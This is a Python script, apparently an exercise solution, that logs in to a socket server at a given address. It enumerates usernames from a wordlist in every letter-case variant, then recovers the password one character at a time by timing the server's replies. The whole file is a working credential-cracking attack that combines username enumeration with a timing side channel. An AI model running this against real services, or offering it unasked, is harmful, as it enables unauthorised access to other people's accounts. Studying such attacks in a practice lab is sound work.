import argparse
import socket
from os import path
import json
from timeit import default_timer
parser = argparse.ArgumentParser()

parser.add_argument('ip_address', type=str)
parser.add_argument('port', type=int)

args = parser.parse_args()

address = (args.ip_address, args.port)


def symbols():
    for num in range(26):
        yield chr(ord('a') + num)
        yield chr(ord('a') + num).upper()
    for num in range(10):
        yield str(num)


def every_case(word: str, curr: str):
    if len(curr) == len(word):
        yield curr
    else:
        if 'a' <= word[len(curr)] <= 'z':
            yield from every_case(word, curr + word[len(curr)].upper())
            yield from every_case(word, curr + word[len(curr)].lower())
        else:
            yield from every_case(word, curr + word[len(curr)])


def find_pwd(login_pwd: str, socket_pwd: socket.socket, curr: str = ""):
    for c in symbols():

        pwd = curr + c
        data_pwd = {
            "login": login_pwd,
            "password": pwd
        }

        socket_pwd.send(json.dumps(data_pwd).encode())
        start_time = default_timer()
        resp = socket_pwd.recv(1024)
        end_time = default_timer()

        time_taken = end_time - start_time
        resp = json.loads(resp.decode())

        if resp["result"] == "Connection success!":
            print(json.dumps(data_pwd), end='')
            break
        elif time_taken > 0.01:
            find_pwd(login_pwd, socket_pwd, pwd)
            break


def hack():
    with socket.socket() as client_socket:
        client_socket.connect(address)

        login = ""

        with open(path.join(path.dirname(__file__), 'logins.txt'), 'r', encoding='utf-8') as file:
            found = False
            for line in file.readlines():
                if line[-1] == '\n':
                    line = line[:-1]
                for lgn in every_case(line, ""):
                    data = {
                        "login": lgn,
                        "password": ""
                    }

                    client_socket.send(json.dumps(data).encode())
                    
                    resp = client_socket.recv(1024)
                    resp = json.loads(resp.decode())
                    
                    if resp["result"] != 'Wrong login!':
                        login = lgn
                        found = True
                        break
                if found:
                    break
            found = False
            find_pwd(login, client_socket)


hack()
